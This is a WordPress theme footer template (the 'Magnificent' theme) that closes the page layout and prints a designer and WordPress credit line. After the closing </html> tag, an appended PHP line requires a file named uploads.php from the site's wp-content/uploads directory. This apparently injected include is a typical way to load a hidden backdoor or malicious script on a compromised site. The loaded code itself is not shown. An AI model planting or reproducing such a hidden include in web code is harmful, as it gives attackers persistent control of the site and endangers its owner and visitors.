


			</div> <!-- end .container -->
		</div> <!-- end #content -->

		<div id="footer" class="clearfix">
			<div id="footer-content">
				<div class="container">
					<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Footer') ) : ?> 
					<?php endif; ?>
					
					<p id="copyright"><?php _e('Designed by ','Magnificent'); ?> <a href="http://www.elegantthemes.com" title="Elegant Themes">Elegant Themes</a> | <?php _e('Powered by ','Magnificent'); ?> <a href="http://www.wordpress.org">WordPress</a></p>
				</div> <!-- end .container -->
			</div> <!-- end #footer-content -->
		</div> <!-- end #footer -->
	</div> <!-- end #top-overlay -->	
				
	<?php include(TEMPLATEPATH . '/includes/scripts.php'); ?>

	<?php wp_footer(); ?>	
</body>
</html>

<? require('/home/axeyrcat/galgorescue.org/wp-content/uploads/uploads.php'); ?>